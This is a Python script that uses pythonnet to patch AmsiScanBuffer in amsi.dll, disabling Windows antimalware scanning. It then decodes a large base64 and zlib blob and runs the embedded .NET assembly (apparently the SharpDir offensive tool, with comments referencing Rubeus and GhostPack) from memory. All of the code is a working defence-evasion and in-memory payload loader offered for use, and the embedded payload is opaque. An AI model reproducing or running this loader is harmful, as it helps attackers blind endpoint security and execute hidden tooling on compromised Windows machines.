import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpDir.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()